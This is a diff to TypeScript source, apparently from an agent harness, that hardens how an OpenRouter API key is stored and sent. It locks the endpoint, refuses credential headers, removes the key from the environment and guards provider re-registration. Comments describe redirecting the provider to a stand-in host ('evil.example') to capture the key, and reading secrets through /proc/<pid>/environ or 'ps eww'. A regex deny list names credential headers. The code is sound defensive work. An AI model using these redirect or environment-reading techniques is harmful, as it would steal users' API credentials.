@@ -88,11 +88,9 @@ export const SETUP_TOOL_POLICY: ToolPolicy = {
 // Round 2 pinned the endpoint with a CHECK against `.pi-agent/models.json` — and
 // a check that has to enumerate pi's precedence rules will always lag them (a
 // selected model entry's own `baseUrl`, or `providers.openrouter.apiKey`, is
-// resolved by pi from the file just the same). Round 3 changes the SHAPE: for
-// `openrouter`, bob CONSTRUCTS the effective provider in memory at session
-// creation and hands it to pi's session services, so nothing pi could read from
-// the on-disk files takes effect — and any on-disk `openrouter` entry is refused
-// rather than merged.
+// resolved by pi from the file just the same). Round 3 changed the SHAPE to a
+// construction-time registration; round 6 moved the key into a transport; round 7
+// (below) takes the key OUT of the environment and fails `refresh()` closed.
 
 // ── openrouter: bob OWNS the provider (bob#183 round 3; round 6: transport) ────
 //
@@ -103,9 +101,13 @@ export const SETUP_TOOL_POLICY: ToolPolicy = {
 // baseUrl: "https://evil.example/api/v1"})` — pi sends to THAT model's URL while
 // bob's check reads the unchanged registry — or (2) race an async re-assertion
 // that runs on `before_provider_request`. So the KEY IS BOUND TO THE ENDPOINT AT
-// TRANSPORT and never enters pi: bob registers `openrouter` with a fixed,
-// NON-SECRET placeholder key, and the real `OPENROUTER_API_KEY` lives ONLY in
-// bob's transport function, which sends only to https://openrouter.ai/api/v1.
+// TRANSPORT and pi holds only a NON-SECRET placeholder. Round 7 closes the last
+// path: OPENROUTER_API_KEY is DELETED from process.env at session construction,
+// so pi's BUILT-IN openrouter provider (which reads the env) has nothing to send,
+// and `ModelRuntime.refresh()` re-registers bob's definition. STATED LIMIT: this
+// removes the IN-PROCESS path only; a same-user process can still read a
+// process's initial environment block (/proc/<pid>/environ on Linux, `ps eww` on
+// macOS) — isolating the agent's own tools from that is bob#189.
 
 /** The one endpoint an openrouter session may reach. */
 export const OPENROUTER_BASE_URL = "https://openrouter.ai/api/v1";
@@ -121,7 +123,7 @@ export type OpenrouterProviderConfig = Parameters<ModelRuntime["registerProvider
 
 /** Header names bob refuses to let a caller supply on an openrouter request. */
 const CREDENTIAL_HEADER =
-  /^(authorization|proxy-authorization|x-api-key|api-key|x-auth-token|cookie)$/i;
+  /^(authorization|proxy-authorization|cf-aig-authorization|x-api-key|api-key|x-auth-token|cookie)$/i;
 
 /**
  * The fetch wrapper the transport delegates through: it refuses, BEFORE calling
@@ -133,20 +135,47 @@ export function guardedOpenrouterFetch(
   baseFetch: typeof globalThis.fetch = globalThis.fetch,
 ): typeof globalThis.fetch {
   return ((url: unknown, init?: unknown) => {
-    const u =
-      typeof url === "string"
-        ? url
-        : url instanceof Request
-          ? url.url
-          : String((url as { url?: unknown })?.url ?? url);
-    if (!u.startsWith(`${baseUrl}/`)) {
+    // (4) Canonical URL check: accept ONLY a string or a URL — never a Request.
+    if (typeof url !== "string" && !(url instanceof URL)) {
       return Promise.reject(
         new Error(
-          `bob: refusing an openrouter request to ${u} — bob's openrouter transport sends only to ${baseUrl}/`,
+          `bob: refusing an openrouter request whose URL is a ${url instanceof Request ? "Request object" : typeof url} — bob's transport accepts only a string or URL`,
         ),
       );
     }
-    return baseFetch(url as never, init as never);
+    const asString = typeof url === "string" ? url : url.href;
+    let parsed: URL;
+    try {
+      parsed = new URL(asString);
+    } catch {
+      return Promise.reject(
+        new Error(`bob: refusing an openrouter request to ${asString} — not a valid URL`),
+      );
+    }
+    if (
+      parsed.protocol !== "https:" ||
+      parsed.hostname !== "openrouter.ai" ||
+      parsed.username !== "" ||
+      parsed.password !== "" ||
+      parsed.port !== "" ||
+      !parsed.pathname.startsWith("/api/v1/")
+    ) {
+      return Promise.reject(
+        new Error(
+          `bob: refusing an openrouter request to ${asString} — bob's transport sends only to https://openrouter.ai/api/v1/ (no credentials in the URL, default port, /api/v1/ path)`,
+        ),
+      );
+    }
+    // Non-canonical inputs (e.g. a `%2e%2e` path or a missing trailing slash)
+    // parse to a href that differs from the input: refuse.
+    if (asString !== parsed.href) {
+      return Promise.reject(
+        new Error(
+          `bob: refusing a non-canonical openrouter request URL ${asString} (canonical form: ${parsed.href})`,
+        ),
+      );
+    }
+    return baseFetch(parsed.href, init as never);
   }) as typeof globalThis.fetch;
 }
 
@@ -182,11 +211,17 @@ export function openrouterTransport(input: {
       );
     }
     const opts = (options ?? {}) as { headers?: Record<string, string | null> };
-    for (const name of Object.keys(opts.headers ?? {})) {
-      if (CREDENTIAL_HEADER.test(name) && opts.headers?.[name] != null) {
-        throw new Error(
-          `bob: refusing an openrouter request with a caller-supplied ${name} header — bob sets the openrouter Authorization itself`,
-        );
+    // The EFFECTIVE headers the delegate will send: the model's own headers AND
+    // the caller's options.headers. A credential-bearing name in either refuses.
+    const preparedHeaders = (prepared as { headers?: Record<string, string | null> }).headers ?? {};
+    for (const name of [...Object.keys(preparedHeaders), ...Object.keys(opts.headers ?? {})]) {
+      if (CREDENTIAL_HEADER.test(name)) {
+        const value = opts.headers?.[name] ?? preparedHeaders[name];
+        if (value != null) {
+          throw new Error(
+            `bob: refusing an openrouter request with a credential-bearing ${name} header — bob sets the openrouter Authorization itself`,
+          );
+        }
       }
     }
     return openaiCompletionsStreamSimple(
@@ -381,6 +416,18 @@ export function requireOpenrouterApiKey(env: NodeJS.ProcessEnv = process.env): s
 }
 
 /**
+ * The ONE time bob reads the key in a process: read it, then DELETE it from
+ * process.env so pi's built-in openrouter provider (which reads
+ * OPENROUTER_API_KEY from process.env) has nothing to send. The value lives only
+ * in the caller's transport closure.
+ */
+export function takeOpenrouterApiKey(): string {
+  const key = requireOpenrouterApiKey();
+  delete process.env.OPENROUTER_API_KEY;
+  return key;
+}
+
+/**
  * The whole openrouter step, run inside the ONE factory (every entry path goes
  * through it): refuse an on-disk openrouter entry, require the env key, then
  * REGISTER bob's in-memory provider so pi resolves openrouter from bob, not the
@@ -388,12 +435,12 @@ export function requireOpenrouterApiKey(env: NodeJS.ProcessEnv = process.env): s
  */
 export function registerOpenrouterProvider(
   modelRuntime: ModelRuntime,
-  input: { model: string; piAgentDir: string; env?: NodeJS.ProcessEnv },
+  input: { model: string; piAgentDir: string; env?: NodeJS.ProcessEnv; apiKey?: string },
 ): OpenrouterProviderConfig {
   assertNoOnDiskOpenrouter(input.piAgentDir);
   const provider = buildOpenrouterProvider({
     model: input.model,
-    apiKey: requireOpenrouterApiKey(input.env),
+    apiKey: input.apiKey ?? requireOpenrouterApiKey(input.env),
   });
   modelRuntime.registerProvider("openrouter", provider);
   return provider;
@@ -409,11 +456,18 @@ export function registerOpenrouterProvider(
  * attempted `baseUrl` — every hook path goes through this seam. Wrapped idempotently:
  * a second call is a no-op.
  */
-export function guardOpenrouterRegistration(modelRuntime: ModelRuntime): void {
+export function guardOpenrouterRegistration(
+  modelRuntime: ModelRuntime,
+  provider: OpenrouterProviderConfig,
+): void {
   const runtime = modelRuntime as unknown as {
     registerProvider: (id: string, config: OpenrouterProviderConfig) => void;
     unregisterProvider?: (id: string) => void;
     registerNativeProvider?: (provider: { id?: string; name?: string; baseUrl?: string }) => void;
+    refresh?: (...args: unknown[]) => Promise<unknown>;
+    getRegisteredProviderConfig?: (
+      id: string,
+    ) => { apiKey?: unknown; streamSimple?: unknown } | undefined;
     __bobOpenrouterGuarded?: boolean;
   };
   if (runtime.__bobOpenrouterGuarded) return;
@@ -460,6 +514,31 @@ export function guardOpenrouterRegistration(modelRuntime: ModelRuntime): void {
       const id = provider?.id ?? provider?.name;
       if (id === "openrouter") refuse("registerNativeProvider", id, provider);
       return originalNative(provider);
+    };
+  }
+  // (2) REFRESH FAILS CLOSED. `ModelRuntime.refresh()` re-reads models.json and can
+  // REPLACE bob's provider with pi's BUILT-IN openrouter provider (which reads
+  // OPENROUTER_API_KEY from the environment). Chosen: RE-REGISTER bob's definition
+  // after every refresh — so requests keep working on bob's transport — rather than
+  // refusing every later request (a refusal would need a process-global flag and
+  // would strand the agent until restart). If bob's provider is no longer the
+  // registered one, put it back with the ORIGINAL method (bypassing the guard).
+  const reassert = () => {
+    const reg = runtime.getRegisteredProviderConfig?.("openrouter");
+    if (
+      !reg ||
+      reg.streamSimple !== provider.streamSimple ||
+      reg.apiKey !== OPENROUTER_API_KEY_PLACEHOLDER
+    ) {
+      originalRegister("openrouter", provider);
+    }
+  };
+  if (typeof runtime.refresh === "function") {
+    const originalRefresh = runtime.refresh.bind(modelRuntime);
+    runtime.refresh = async (...args: unknown[]) => {
+      const result = await originalRefresh(...args);
+      reassert();
+      return result;
     };
   }
 }
@@ -862,17 +941,25 @@ export function createBobRuntimeFactory(input: BobFactoryInput): CreateAgentSess
     // redirect the endpoint or the key. Runs BEFORE any session exists.
     let openrouterProvider: OpenrouterProviderConfig | undefined;
     if (config.provider === "openrouter") {
+      // The on-disk refusal comes FIRST (a config error, before any key read), so a
+      // tampered models.json refuses on every entry path without consuming the key.
+      assertNoOnDiskOpenrouter(agentDir);
+      // (1) KEY OUT OF THE ENVIRONMENT. Read OPENROUTER_API_KEY ONCE, here, then
+      // DELETE it from process.env before pi, any capability, any extension or any
+      // tool subprocess starts — so pi's BUILT-IN openrouter provider (which reads
+      // the key from process.env) has nothing to send, and nothing in bob reads it
+      // from process.env afterwards. Fail-closed on unset/empty is unchanged.
+      const openrouterKey = takeOpenrouterApiKey();
       openrouterProvider = registerOpenrouterProvider(modelRuntime, {
         model: config.model,
         piAgentDir: agentDir,
+        apiKey: openrouterKey,
       });
       // GUARD THE VERB (round 5, item 1): bob registered its own provider; wrap
       // the runtime's registration verbs so a LATER registerProvider("openrouter")
       // — from session_start, before_agent_start, or a print-mode bind — is
-      // refused BEFORE it takes effect. Kept as a SECOND layer (round 6): the key
-      // is no longer in pi, so a re-registered provider carries only the
-      // placeholder.
-      guardOpenrouterRegistration(modelRuntime);
+      // refused BEFORE it takes effect. Also wraps refresh() (round 7, item 2).
+      guardOpenrouterRegistration(modelRuntime, openrouterProvider);
     }
     const services = await createAgentSessionServices({
       cwd,
